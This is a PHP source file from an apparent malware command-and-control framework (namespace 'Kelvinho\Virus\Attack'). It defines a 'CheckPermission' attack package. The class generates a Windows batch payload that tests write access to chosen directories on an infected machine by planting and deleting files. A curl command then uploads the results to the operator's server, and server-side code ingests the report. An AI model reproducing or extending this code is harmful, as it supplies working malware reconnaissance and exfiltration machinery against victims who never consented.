<?php /** @noinspection PhpUnused */

/** @noinspection PhpUnusedParameterInspection */

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\BaseScriptWin;
use Kelvinho\Virus\Logs;
use function Kelvinho\Virus\filter;

class CheckPermission extends AttackInterface {
    public static int $PERMISSION_UNSET = -1;
    public static int $PERMISSION_NOT_ALLOWED = 0;
    public static int $PERMISSION_ALLOWED = 1;
    public static int $PERMISSION_DOES_NOT_EXIST = 2;

    private array $directories = [];

    public function setDirectories($blockDirectories) {
        $directories = filter(explode("\n", $blockDirectories), function ($line) {
            return !empty(trim($line));
        });
        $this->directories = [];
        foreach ($directories as $directory) {
            $this->directories[] = array("path" => $directory, "perm" => -1);
        }
    }

    public function setPermissions($blockResult) {
        $lines = filter(explode("\n", $blockResult), function ($line) {
            return !(empty(trim($line)) || trim($line) == ".");
        });
        foreach ($lines as $line) {
            $contents = filter(explode(";", $line), function ($element) {
                return !(empty(trim($element)) && trim($element) != "0");
            });
            $count = (int)$contents[0];
            $perm = (int)$contents[1];
            if ($count < count($this->directories)) {
                ob_start();
                var_dump($contents);
                Logs::log(ob_get_clean());
                $this->directories[$count]["perm"] = $perm;
            }
        }
    }

    public function getDirectoriesAsBlock(): string {
        $block = "";
        foreach ($this->directories as $directory) {
            $block .= $directory["path"] . "\n";
        }
        return $block;
    }

    public function getDirectories(int $permission) {
        return filter($this->directories, function ($directory, $index, $permission) {
            return $directory["perm"] == $permission;
        }, $permission);
    }

    /**
     * This will generate the intercept code that will be used to take the reported data back from the virus.
     */
    //@formatter:off
    public function generateIntercept(): string {
        ob_start(); ?>
        if (isset($_FILES["permFile"])) {
            $contents = file_get_contents($_FILES["permFile"]["tmp_name"]);
            $attack = $attackFactory->get("<?php echo $this->attack_id; ?>");
            $attack->setPermissions($contents);
            $attack->setExecuted();
            $attack->saveState();
        }
        <?php return ob_get_clean();
    }
    //@formatter:on

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->directories = $state["directories"];
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    protected function getState(): string {
        $state = [];
        $state["directories"] = $this->directories;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl --form "permFile=@%~pd0perm" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    /**
     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     *
     * @return string
     */
    //@formatter:off
    public function generateBatchCode(): string {
        ob_start();
        $hash = hash("sha256", rand()); ?>
        SetLocal EnableDelayedExpansion
        chCp 65001
        echo _>%~pd0perm
        echo _>%~pd0temp
        <?php
        foreach ($this->directories as $index => $value) { $path = $value["path"]; ?>
        if not exist "<?php echo $path; ?>" (echo <?php echo $index; ?>;<?php echo self::$PERMISSION_DOES_NOT_EXIST ?>; >> %~pd0perm) else (
            copy %~pd0temp "<?php echo $path; ?>\<?php echo $hash; ?>"
            if "!errorLevel!" == "1" (echo <?php echo $index; ?>;<?php echo self::$PERMISSION_NOT_ALLOWED; ?>; >> %~pd0perm) else (
                echo <?php echo $index; ?>;<?php echo self::$PERMISSION_ALLOWED; ?>; >> %~pd0perm
                del "<?php echo $path; ?>\<?php echo $hash; ?>"
            )
        )
        <?php } ?>
        :end_payload
        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        return ob_get_clean();
    }
    //@formatter:on

    /**
     * @inheritDoc
     */
    public function processExtras(string $resource): void {
    }
}
